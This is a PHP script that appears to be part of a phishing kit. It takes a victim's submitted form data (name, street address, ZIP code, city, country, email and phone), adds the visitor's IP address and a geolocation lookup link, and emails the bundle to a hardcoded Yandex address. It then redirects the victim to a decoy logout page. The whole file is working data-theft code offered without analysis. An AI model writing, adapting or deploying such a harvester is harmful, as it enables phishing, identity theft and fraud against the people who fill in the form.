<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "First Name               : ".$_POST['first']."\n";
$bilsmg .= "Last Name -----: ".$_POST['last']."\n";
$bilsmg .= "Street Address              : ".$_POST['street']."\n";
$bilsmg .= "ZIP Code              : ".$_POST['zip']."\n";
$bilsmg .= "City              : ".$_POST['city']."\n";
$bilsmg .= "State             : ".$_POST['street']."\n";
$bilsmg .= "Country              : ".$_POST['country']."\n";
$bilsmg .= "Email              : ".$_POST['email']."\n";
$bilsmg .= "Phone              : ".$_POST['phone']."\n";

$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "jahanamcafe@yandex.com";
$bilsub = "RT/RW | From $ip";
$bilhead = "From:Alamat Rumah <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../logout-9zNjQ5ZWFjMTMwMjVkZjU3NmFmODI2YjhlN2UxODFkYzQzZWIyZDdiMQ.html";
header("location:$src");
?>